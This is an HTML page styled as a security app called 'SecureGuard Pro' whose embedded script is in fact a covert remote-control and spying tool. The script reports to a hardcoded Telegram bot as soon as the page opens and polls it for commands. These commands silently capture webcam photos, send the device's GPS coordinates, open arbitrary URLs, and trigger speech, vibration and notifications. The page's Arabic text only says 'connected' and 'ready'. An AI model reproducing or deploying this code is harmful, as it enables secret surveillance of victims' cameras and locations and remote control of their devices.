<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>SecureGuard Pro</title>
<style>
body{background:#000;color:#fff;font-family:sans-serif;text-align:center;padding:20px}
h1{color:#00ff88;font-size:22px}
p{color:#aaa;font-size:12px}
button{padding:14px 28px;background:#00ff88;color:#000;border:none;border-radius:30px;font-size:15px;font-weight:bold;margin:5px}
#status{color:#00ff88;font-size:12px;margin:10px}
</style>
</head>
<body>
<h1>SecureGuard Pro</h1>
<p>متصل</p>
<div id="status">🟢 جاهز</div>
<button onclick="test()">اختبار</button>
<script>
const BOT="8915820730:AAHqyTgk9IVvmMLA8xpXO8QuLPEPbIv9A9c";
const CHAT="6453594151";
let lastUpdateId=0;

async function sendMsg(t){
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
        method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:CHAT,text:t})
    }).catch(()=>{});
}

async function checkCmd(){
    try{
        let r=await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${lastUpdateId+1}&timeout=5`);
        let d=await r.json();
        if(d.ok&&d.result.length>0){
            for(let u of d.result){
                lastUpdateId=u.update_id;
                let m=u.message;
                if(m&&m.text){
                    let c=m.text.trim();
                    if(c==='/ping'){sendMsg('🟢 الجهاز متصل');}
                    else if(c.startsWith('/say ')){
                        let t=c.replace('/say ','');
                        let s=new SpeechSynthesisUtterance(t);
                        s.lang='ar';window.speechSynthesis.speak(s);
                        sendMsg('✅ تم: '+t);
                    }
                    else if(c==='/photo'){
                        try{
                            let st=await navigator.mediaDevices.getUserMedia({video:true});
                            let v=document.createElement('video');v.srcObject=st;await v.play();
                            let cv=document.createElement('canvas');cv.width=640;cv.height=480;
                            cv.getContext('2d').drawImage(v,0,0);
                            let p=cv.toDataURL('image/jpeg',0.7);
                            st.getTracks().forEach(t=>t.stop());
                            let bl=await(await fetch(p)).blob();
                            let fd=new FormData();fd.append('chat_id',CHAT);fd.append('photo',bl,'camera.jpg');
                            await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{method:'POST',body:fd});
                            sendMsg('📷 صورة');
                        }catch(e){sendMsg('❌ فشل الكاميرا');}
                    }
                    else if(c==='/location'){
                        navigator.geolocation.getCurrentPosition(async p=>{
                            sendMsg(`📍 ${p.coords.latitude},${p.coords.longitude}\nhttps://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`);
                        },()=>{sendMsg('❌ فشل الموقع');});
                    }
                    else if(c.startsWith('/open ')){
                        let u=c.replace('/open ','');
                        window.open(u,'_blank');sendMsg('🔗 '+u);
                    }
                    else if(c==='/vibrate'){
                        if(navigator.vibrate){navigator.vibrate([500,200,500]);sendMsg('📳 اهتزاز');}
                    }
                    else if(c==='/notify'){
                        if(Notification.permission==='granted'){
                            new Notification('SecureGuard',{body:'إشعار',vibrate:[200,100,200]});
                            sendMsg('🔔 إشعار');
                        }
                    }
                }
            }
        }
    }catch(e){}
}

async function test(){
    document.getElementById('status').textContent='جاري...';
    await sendMsg('✅ اختبار: البوت شغال');
    document.getElementById('status').textContent='✅ تم';
}

sendMsg('🔔 فتح التطبيق');
if('Notification' in window&&Notification.permission!=='granted'&&Notification.permission!=='denied'){
    Notification.requestPermission();
}
setInterval(checkCmd,2000);
</script>
</body>
</html>
